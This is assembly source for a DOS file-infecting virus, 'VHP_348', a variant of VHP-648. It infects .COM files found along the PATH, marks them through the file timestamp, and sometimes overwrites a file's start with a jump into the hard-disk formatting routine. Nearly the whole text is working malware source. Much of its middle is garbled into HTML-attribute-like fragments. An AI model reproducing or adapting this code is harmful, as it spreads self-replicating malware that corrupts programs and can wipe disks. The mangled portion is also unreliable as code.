

        page    ,132
        name    VHP_348
        title   Virus; based on the famous VHP-648 virus
        .radix  16

code    segment
        assume  cs:code,ds:code

        org     100

environ equ     2C

newjmp  equ     7Bh             ;Code of jmp instruction
codept  equ     7A              ;Here is formed a jump to the virus code
pname   equ     78              ;Offset of file name in the dir path
poffs   equ     76              ;Offset in the contents of the `PATH' variable
;errhnd equ     74              ;Save place for the old error handler
fname   equ     70              ;Path name to search for
mydta   equ     2C              ;DTA for Find First/Next:
attrib  equ     17              ;File attribute
time    equ     16              ;File time
date    equ     14              ;File date
fsize   equ     12              ;File size
namez   equ     0E              ;File name found

start:
        jmp     short begin
        nop
        int     20

saveins db      3 dup (90)      ;Original first 3 bytes

begin:
        call    virus           ;Detrmine the virus start address

data    label   byte            ;Data section

allcom  db      '*.COM',0       ;Filespec to search for
pathstr db      'PATH='

;This replaces the first instruction of a destroyed file.
;It's a JMP instruction into the hard disk formatting program (IBM XT only):

bad_jmp db      0EA,6,0,0,0C8

virus:
        pop     bx              ;Make BX pointed at data
        mov     di,offset start ;Push the program true start address
        push    di              ; onto the stack
        push    ax              ;Save AX

        cld
        lea     si,[bx+saveins-data]    ;Original instruction saved there
        movsw                   ;Move 2 + 1 bytes
        movsb
        mov     si,bx           ;Keep SI pointed at data

        lea     bp,[bx+endcode-data+7A] ;Reserve local storage

        mov     ax,3524         ;Get interrupt 24h handler
        int     21              ; and save it in errhnd

        mov     ah,25           ;Set interrupt 24h handler
        lea     dx,[si+handler-data]
        cmp     al,0            ;DOS < 2.0="" zeroes="" al="" je="" exit="" ;exit="" if="" version="">< 2.0="" push="" es="" ;mov="" [bp-errhnd],bx="" push="" bx="" ;mov="" [bp-errhnd+2],es="" int="" 21="" lea="" dx,[bp-mydta]="" mov="" ax,1a00="" ;set="" dta="" int="" 21="" xor="" di,di="" ;point="" es:di="" at="" the="" environment="" start="" mov="" es,ds:[di+environ]="" ;environment="" address="" mov="" bx,si="" search:="" ;search="" 'path'="" in="" the="" environment="" lea="" si,[bx+pathstr-data]="" mov="" cx,5="" ;5="" letters="" in="" 'path='
        repe    cmpsb
        je      pfound          ;PATH found, continue
        mov     ch,80           ;Maximum 32 K in environment
        repne   scasb           ;If not, skip through next 0
        scasb                   ;End of environment?
        dec     di
        jc      search          ;If not, retry
pfound:
        push    ds
        pop     es              ;Restore ES

        mov     [bp-poffs],di   ;Save ' path'="" offset="" in="" poffs="" ;="" push="" di="" lea="" di,[bp-fname]="" mov="" [bp-pname],di="" filesrch:="" lea="" si,[bx+allcom-data]="" movsw="" movsw="" ;move="" '*.com'="" at="" fname="" movsw="" mov="" si,bx="" ;restore="" si="" mov="" ah,4e="" ;find="" first="" file="" lea="" dx,[bp-fname]="" mov="" cl,11b="" ;hidden,="" read/only="" or="" normal="" files="" jmp="" short="" findfile="" checkfile:="" mov="" al,[bp-time]="" ;check="" file="" time="" inc="" al="" and="" al,11111b="" ;are="" the="" seconds="" equal="" to="" 1fh?="" ;if="" so,="" file="" is="" already="" contains="" the="" virus,="" search="" for="" another:="" jz="" findnext="" ;is="" 10=""><= file_size=""></=><= 64,000="" bytes?="" sub="" word="" ptr="" [bp-fsize],10d="" cmp="" [bp-fsize],64000d-10d+1="" jc="" process="" ;if="" so,="" process="" the="" file="" findnext:="" ;otherwise="" find="" the="" next="" file="" mov="" ah,4f="" ;find="" next="" file="" findfile:="" int="" 21="" jnc="" checkfile="" ;if="" found,="" go="" chech="" some="" conditions="" nextdir:="" ;="" pop="" si="" mov="" si,[bp-poffs]="" ;get="" the="" offset="" in="" the="" path="" variable="" lea="" di,[bp-fname]="" ;point="" es:di="" at="" fname="" mov="" ds,ds:[environ]="" ;point="" ds:si="" at="" the="" path="" variable="" found="" cmp="" byte="" ptr="" [si],0="" ;0="" means="" end="" of="" path="" jnz="" cpydir="" olddta:="" mov="" ax,2524="" ;set="" interrupt="" 24h="" handler="" pop="" dx="" ;lds="" dx,dword="" ptr="" [bp-errhnd]="" pop="" ds="" int="" 21="" push="" cs="" pop="" ds="" ;restore="" ds="" exit:="" mov="" ah,1a="" ;set="" dta="" mov="" dx,80="" ;restore="" dta="" int="" 21="" pop="" ax="" ret="" ;go="" to="" cs:ip="" by="" doing="" funny="" ret="" cpydir:="" lodsb="" ;get="" a="" char="" from="" the="" path="" variable="" cmp="" al,';'="" ;`;'="" means="" end="" of="" directory="" je="" enddir="" cmp="" al,0="" ;0="" means="" end="" of="" path="" variable="" je="" enddir="" stosb="" ;put="" the="" char="" in="" fname="" jmp="" cpydir="" ;loop="" until="" done="" enddir:="" push="" cs="" pop="" ds="" ;restore="" ds="" ;="" push="" si="" mov="" [bp-poffs],si="" ;save="" the="" new="" offset="" in="" the="" path="" variable="" mov="" al,'\'="" ;add="" '\'="" stosb="" mov="" [bp-pname],di="" jmp="" filesrch="" ;and="" go="" find="" the="" first="" *.com="" file="" process:="" mov="" di,[bp-pname]="" lea="" si,[bp-namez]="" ;point="" si="" at="" namez="" cpyname:="" lodsb="" ;copy="" name="" found="" to="" fname="" stosb="" cmp="" al,0="" jne="" cpyname="" mov="" si,bx="" ;restore="" si="" mov="" ax,4301="" ;set="" file="" attributes="" call="" clr_cx_dos="" mov="" ax,3d02="" ;open="" file="" with="" read/write="" access="" int="" 21="" jc="" oldattr="" ;exit="" on="" error="" mov="" bx,ax="" ;save="" file="" handle="" in="" bx="" mov="" ah,2c="" ;get="" system="" time="" int="" 21="" and="" dh,111b="" ;are="" seconds="" a="" multiple="" of="" 8?="" jnz="" infect="" ;if="" not,="" contaminate="" file="" (don't="" destroy):="" ;destroy="" file="" by="" rewriting="" the="" first="" instruction:="" mov="" cx,5="" ;write="" 5="" bytes="" lea="" dx,[si+bad_jmp-data]="" ;write="" these="" bytes="" jmp="" short="" do_write="" ;do="" it="" ;try="" to="" contaminate="" file:="" ;read="" first="" instruction="" of="" the="" file="" (first="" 3="" bytes)="" and="" save="" it="" in="" saveins:="" infect:="" mov="" ah,3f="" ;read="" from="" file="" handle="" mov="" cx,3="" ;read="" 3="" bytes="" lea="" dx,[si+saveins-data]="" ;put="" them="" there="" call="" dos_rw="" jc="" oldtime="" ;exit="" on="" error="" ;move="" file="" pointer="" to="" end="" of="" file:="" mov="" ax,4202="" ;lseek="" from="" end="" of="" file="" call="" clr_dx_cx_dos="" mov="" [bp-codept],ax="" ;save="" result="" in="" codept="" mov="" cx,endcode-saveins="" ;virus="" code="" length="" as="" bytes="" to="" be="" written="" lea="" dx,[si+saveins-data]="" ;write="" from="" saveins="" to="" endcode="" call="" dos_write="" ;write="" to="" file="" handle="" jc="" oldtime="" ;exit="" on="" error="" call="" lseek="" ;lseek="" to="" the="" beginning="" of="" the="" file="" ;rewrite="" the="" first="" instruction="" of="" the="" file="" with="" a="" jump="" to="" the="" virus="" code:="" mov="" cl,3="" ;3="" bytes="" to="" write="" lea="" dx,[bp-newjmp]="" ;write="" these="" bytes="" do_write:="" call="" dos_write="" ;write="" to="" file="" handle="" oldtime:="" mov="" dx,[bp-date]="" ;restore="" file="" date="" mov="" cx,[bp-time]="" ;="" and="" time="" or="" cl,11111b="" ;set="" seconds="" to="" 62="" (the="" virus'="" marker)="" mov="" ax,5701="" ;set="" file="" date="" &="" time="" int="" 21="" mov="" ah,3e="" ;close="" file="" handle="" int="" 21="" oldattr:="" mov="" ax,4301="" ;set="" file="" attributes="" mov="" cx,[bp-attrib]="" ;they="" were="" saved="" in="" attrib="" and="" cx,3f="" lea="" dx,[bp-fname]="" int="" 21="" ;do="" it="" jmp="" olddta="" ;and="" exit="" lseek:="" mov="" ax,4200="" ;lseek="" from="" the="" beginning="" of="" the="" file="" clr_dx_cx_dos:="" xor="" dx,dx="" ;from="" the="" very="" beginning="" clr_cx_dos:="" ;auxiliary="" entry="" point="" repne="" cmp="" ax,100="" ;trick="" org="" $-2="" dos_write:="" mov="" ah,40="" ;write="" to="" file="" handle="" dos_rw:="" int="" 21="" jc="" dos_ret="" ;exit="" on="" error="" cmp="" ax,cx="" ;set="" cf="" if="" ax=""></=>< cx="" dos_ret:="" ret="" handler:="" ;critical="" error="" handler="" mov="" al,0="" ;just="" ignore="" the="" error="" iret="" ;="" and="" return="" db="" 0e9="" ;the="" jmp="" opcode="" endcode="" label="" byte="" code="" ends="" end="" start="" ="">